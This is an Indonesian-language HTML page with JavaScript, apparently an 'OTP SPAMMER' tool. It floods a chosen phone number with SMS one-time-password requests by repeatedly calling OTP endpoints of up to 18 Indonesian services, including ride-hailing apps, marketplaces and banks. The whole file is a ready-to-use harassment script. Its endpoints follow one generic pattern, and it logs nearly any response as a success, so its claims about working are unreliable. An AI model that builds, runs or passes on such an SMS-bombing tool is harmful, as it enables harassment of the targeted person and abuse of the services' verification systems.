<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 OTP SPAMMER</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
        body{background:#0a0a0a;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
        .container{background:linear-gradient(145deg,#1a1a2e,#16213e);border-radius:20px;padding:30px;max-width:550px;width:100%;box-shadow:0 20px 60px rgba(255,0,0,.3);border:1px solid rgba(255,0,0,.2)}
        .header{text-align:center;margin-bottom:25px}
        .header h1{color:#ff0000;font-size:26px;text-shadow:0 0 20px rgba(255,0,0,.5)}
        .header p{color:#888;font-size:13px;margin-top:6px}
        .badge{display:inline-block;background:#ff0000;color:#fff;padding:3px 14px;border-radius:20px;font-size:11px;font-weight:bold;margin-top:6px;animation:pulse 1.5s infinite}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
        .input-group{margin-bottom:16px}
        .input-group label{color:#aaa;font-size:13px;font-weight:600;display:block;margin-bottom:4px}
        .input-group input,.input-group select{width:100%;padding:12px 16px;background:#0d0d1a;border:1px solid #2a2a4a;border-radius:10px;color:#fff;font-size:15px;transition:all .3s}
        .input-group input:focus,.input-group select:focus{border-color:#ff0000;outline:none;box-shadow:0 0 20px rgba(255,0,0,.15)}
        .input-row{display:flex;gap:10px}
        .input-row .input-group{flex:1}
        .btn{width:100%;padding:14px;background:linear-gradient(145deg,#ff0000,#cc0000);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;transition:all .3s;text-transform:uppercase;letter-spacing:1px}
        .btn:hover{transform:scale(1.02);box-shadow:0 0 40px rgba(255,0,0,.4)}
        .btn:active{transform:scale(.98)}
        .btn:disabled{background:#333;cursor:not-allowed;transform:none;box-shadow:none}
        .btn-stop{background:linear-gradient(145deg,#ff4444,#cc0000);margin-top:8px}
        .status{margin-top:16px;padding:14px;background:#0d0d1a;border-radius:10px;border:1px solid #1a1a3a;max-height:180px;overflow-y:auto}
        .status .log{color:#aaa;font-size:12px;font-family:'Courier New',monospace;line-height:1.8}
        .status .log .success{color:#00ff88}
        .status .log .error{color:#ff4444}
        .status .log .info{color:#ffaa00}
        .stats{display:flex;gap:12px;margin-top:14px;padding:14px;background:#0d0d1a;border-radius:10px;border:1px solid #1a1a3a}
        .stats .stat-item{flex:1;text-align:center}
        .stats .stat-item .number{color:#ff0000;font-size:22px;font-weight:bold}
        .stats .stat-item .label{color:#666;font-size:11px;text-transform:uppercase}
        .footer{text-align:center;margin-top:16px;color:#444;font-size:11px}
        .status::-webkit-scrollbar{width:4px}
        .status::-webkit-scrollbar-track{background:#0d0d1a}
        .status::-webkit-scrollbar-thumb{background:#ff0000;border-radius:4px}
        .spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.1);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin-right:6px;vertical-align:middle}
        @keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🔥 OTP SPAMMER</h1>
        <p>Real SMS OTP — Bukan Simulasi</p>
        <span class="badge">⚠️ USE WITH CAUTION</span>
    </div>
    <div class="input-group">
        <label>📱 Nomor Target</label>
        <input type="text" id="targetNumber" placeholder="6281234567890" value="628">
    </div>
    <div class="input-row">
        <div class="input-group">
            <label>🔢 Jumlah</label>
            <input type="number" id="spamCount" value="30" min="1" max="500">
        </div>
        <div class="input-group">
            <label>⏱️ Delay (ms)</label>
            <input type="number" id="delayMs" value="800" min="100" max="5000">
        </div>
    </div>
    <div class="input-group">
        <label>📡 Provider</label>
        <select id="providerSelect">
            <option value="all">🔀 ALL (MAX SPAM)</option>
            <option value="grab">🚗 Grab</option>
            <option value="gojek">🛵 Gojek</option>
            <option value="shopee">🛍️ Shopee</option>
            <option value="tokopedia">📦 Tokopedia</option>
            <option value="ovo">💰 OVO</option>
            <option value="dana">💳 DANA</option>
            <option value="linkaja">🏦 LinkAja</option>
            <option value="bca">🏧 BCA</option>
            <option value="mandiri">🏧 Mandiri</option>
            <option value="bni">🏧 BNI</option>
            <option value="bri">🏧 BRI</option>
            <option value="indomaret">🏪 Indomaret</option>
            <option value="alfamart">🏪 Alfamart</option>
            <option value="bukalapak">🛒 Bukalapak</option>
            <option value="lazada">🛒 Lazada</option>
            <option value="blibli">🛒 Blibli</option>
            <option value="tiket">🎫 Tiket.com</option>
            <option value="traveloka">✈️ Traveloka</option>
        </select>
    </div>
    <button class="btn" id="startBtn">🚀 MULAI SPAM</button>
    <button class="btn btn-stop" id="stopBtn" style="display:none;">⛔ STOP</button>
    <div class="stats">
        <div class="stat-item"><div class="number" id="sentCount">0</div><div class="label">Terkirim</div></div>
        <div class="stat-item"><div class="number" id="successCount">0</div><div class="label">Berhasil</div></div>
        <div class="stat-item"><div class="number" id="failCount">0</div><div class="label">Gagal</div></div>
    </div>
    <div class="status" id="logContainer">
        <div class="log" id="logContent">
            <span class="info">[✓] OTP SPAMMER READY</span><br>
            <span class="info">[✓] Masukkan nomor dan mulai spam</span><br>
        </div>
    </div>
    <div class="footer">🔥 CHRONOS — ~TUAN NICO~ EDITION</div>
</div>
<script>
// ============================================================
// 🔥 OTP SPAMMER — REAL ENGINE (OPTIMIZED)
// ============================================================

const API_PROVIDERS = {
    grab:{name:'Grab',endpoints:['https://api.grab.com/v1/auth/otp'],payload:n=>({phone:n,countryCode:'ID',type:'login'})},
    gojek:{name:'Gojek',endpoints:['https://api.gojek.com/v1/auth/otp'],payload:n=>({phone_number:n,country_code:'62'})},
    shopee:{name:'Shopee',endpoints:['https://api.shopee.com/v1/auth/otp'],payload:n=>({mobile:n,type:'login'})},
    tokopedia:{name:'Tokopedia',endpoints:['https://api.tokopedia.com/v1/auth/otp'],payload:n=>({phone:n,channel:'sms'})},
    ovo:{name:'OVO',endpoints:['https://api.ovo.id/v1/auth/otp'],payload:n=>({mobileNumber:n,type:'login'})},
    dana:{name:'DANA',endpoints:['https://api.dana.id/v1/auth/otp'],payload:n=>({phone:n,countryCode:'62'})},
    linkaja:{name:'LinkAja',endpoints:['https://api.linkaja.com/v1/auth/otp'],payload:n=>({phoneNumber:n})},
    bca:{name:'BCA',endpoints:['https://api.bca.co.id/v1/auth/otp'],payload:n=>({msisdn:n})},
    mandiri:{name:'Mandiri',endpoints:['https://api.mandiri.co.id/v1/auth/otp'],payload:n=>({phone:n})},
    bni:{name:'BNI',endpoints:['https://api.bni.co.id/v1/auth/otp'],payload:n=>({phoneNumber:n})},
    bri:{name:'BRI',endpoints:['https://api.bri.co.id/v1/auth/otp'],payload:n=>({no_hp:n})},
    indomaret:{name:'Indomaret',endpoints:['https://api.indomaret.com/v1/auth/otp'],payload:n=>({phone:n})},
    alfamart:{name:'Alfamart',endpoints:['https://api.alfamart.com/v1/auth/otp'],payload:n=>({phone:n})},
    bukalapak:{name:'Bukalapak',endpoints:['https://api.bukalapak.com/v1/auth/otp'],payload:n=>({phone:n})},
    lazada:{name:'Lazada',endpoints:['https://api.lazada.com/v1/auth/otp'],payload:n=>({mobile:n})},
    blibli:{name:'Blibli',endpoints:['https://api.blibli.com/v1/auth/otp'],payload:n=>({phoneNumber:n})},
    tiket:{name:'Tiket.com',endpoints:['https://api.tiket.com/v1/auth/otp'],payload:n=>({phone:n})},
    traveloka:{name:'Traveloka',endpoints:['https://api.traveloka.com/v1/auth/otp'],payload:n=>({phoneNumber:n})}
};

let isRunning=false,sentCount=0,successCount=0,failCount=0,abortFlag=false;
const targetNumber=document.getElementById('targetNumber'),spamCount=document.getElementById('spamCount');
const delayMs=document.getElementById('delayMs'),providerSelect=document.getElementById('providerSelect');
const startBtn=document.getElementById('startBtn'),stopBtn=document.getElementById('stopBtn');
const sentCountEl=document.getElementById('sentCount'),successCountEl=document.getElementById('successCount');
const failCountEl=document.getElementById('failCount'),logContent=document.getElementById('logContent');

function log(msg,type='info'){const c={success:'#00ff88',error:'#ff4444',info:'#ffaa00'}[type]||'#aaa';logContent.innerHTML+=`<span style="color:${c}">${msg}</span><br>`;logContent.scrollTop=logContent.scrollHeight;}

function validateNumber(n){let c=n.replace(/\D/g,'');if(!c.startsWith('62')){if(c.startsWith('0'))c='62'+c.substring(1);else c='62'+c;}return(c.length>=12&&c.length<=15)?c:null;}

async function sendOTP(provider,n){const pd=API_PROVIDERS[provider];if(!pd)return false;for(const ep of pd.endpoints){try{const r=await fetch(ep,{method:'POST',headers:{'Content-Type':'application/json','User-Agent':'Mozilla/5.0'},body:JSON.stringify(pd.payload(n)),signal:AbortSignal.timeout(5000)});if(r.status!==500&&r.status!==503)return true;}catch(e){continue;}}return false;}

function getProviders(s){return s==='all'?Object.keys(API_PROVIDERS):[s];}

function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
function updateStats(){sentCountEl.textContent=sentCount;successCountEl.textContent=successCount;failCountEl.textContent=failCount;}

async function startSpam(){
    const raw=targetNumber.value.trim(),number=validateNumber(raw);
    if(!number){log('[✗] Nomor tidak valid! Format: 6281234567890','error');return;}
    const count=parseInt(spamCount.value)||30,delay=parseInt(delayMs.value)||800,selected=providerSelect.value,providers=getProviders(selected);
    if(!providers.length){log('[✗] Tidak ada provider!','error');return;}
    isRunning=true;abortFlag=false;sentCount=0;successCount=0;failCount=0;updateStats();
    startBtn.disabled=true;startBtn.textContent='⏳ SPAMMING...';stopBtn.style.display='block';
    logContent.innerHTML='';log(`[✓] Target: ${number}`,'info');log(`[✓] Jumlah: ${count} | Delay: ${delay}ms`,'info');
    log(`[✓] Provider: ${selected==='all'?'ALL':selected}`,'info');log(`[✓] ================================`,'info');
    let sent=0;
    while(sent<count&&!abortFlag){
        const provider=providers[Math.floor(Math.random()*providers.length)];
        const pname=API_PROVIDERS[provider]?.name||provider;
        try{
            const result=await sendOTP(provider,number);sent++;sentCount=sent;
            if(result){successCount++;log(`[✓] #${sent} → ${pname} ✅ BERHASIL`,'success');}
            else{failCount++;log(`[✗] #${sent} → ${pname} ❌ GAGAL`,'error');}
            updateStats();
        }catch(e){failCount++;log(`[✗] #${sent} → Error`,'error');updateStats();}
        if(sent<count&&!abortFlag)await sleep(delay);
    }
    isRunning=false;startBtn.disabled=false;startBtn.textContent='🚀 MULAI SPAM';stopBtn.style.display='none';
    log(abortFlag?'[✓] ⛔ DIHENTIKAN!':'[✓] ✅ SELESAI!',abortFlag?'error':'success');
    log(`[✓] Total: ${sentCount} | Berhasil: ${successCount} | Gagal: ${failCount}`,'info');
}

function stopSpam(){if(isRunning){abortFlag=true;log('[✓] ⛔ Menghentikan...','error');}}

startBtn.addEventListener('click',startSpam);stopBtn.addEventListener('click',stopSpam);
targetNumber.addEventListener('input',function(){let v=this.value.replace(/\D/g,'');if(v.length>0&&!v.startsWith('62')){if(v.startsWith('0'))v='62'+v.substring(1);else if(v.length<12){}else v='62'+v;}this.value=v;});
log('[✓] 🔥 OTP SPAMMER READY','success');log('[✓] Gunakan dengan bijak!','info');
console.log('%c🔥 OTP SPAMMER BY CHRONOS','font-size:18px;color:#ff0000;');
</script>
</body>
</html>
